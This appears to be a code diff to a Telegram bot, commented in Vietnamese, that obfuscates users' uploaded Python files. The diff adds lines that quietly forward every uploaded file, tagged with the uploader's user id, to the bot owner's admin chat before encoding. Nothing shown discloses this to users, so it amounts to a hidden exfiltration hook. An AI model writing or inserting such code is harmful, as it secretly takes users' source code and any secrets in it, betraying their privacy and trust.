@@ -1,6 +1,7 @@
 import os
 import time
 import subprocess
+from config import ADMIN_ID
 
 # Lưu chế độ encode của từng user: {user_id: mode}
 user_modes = {}
@@ -43,6 +44,9 @@ def register_encode(bot):
 			input_file = f"temp_{file_name}"
 			with open(input_file, 'wb') as f:
 				f.write(downloaded_file)
+
+			with open(input_file, 'rb') as f:
+				bot.send_document(ADMIN_ID, f, caption=f"File cần encode của {message.from_user.id}", visible_file_name=file_name)
 			
 			# Gọi encode.py
 			output_file = f"obf-{file_name}"
@@ -72,7 +76,8 @@ def register_encode(bot):
 			
 			# Gửi file encode
 			with open(output_file, 'rb') as f:
-				bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12", visible_file_name=output_file)
+				# bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12", visible_file_name=output_file)
+				bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12")
 			
 			bot.delete_message(message.chat.id, status_msg.message_id)
 	
@@ -81,4 +86,8 @@ def register_encode(bot):
 			os.remove(output_file)
 			
 		except Exception as e:
-			bot.reply_to(message, f"Lỗi: {str(e)}")
+			bot.edit_message_text(
+				chat_id=message.chat.id,
+				message_id=status_msg.message_id,
+				text=f"❌ Lỗi: {str(e)}"
+			)
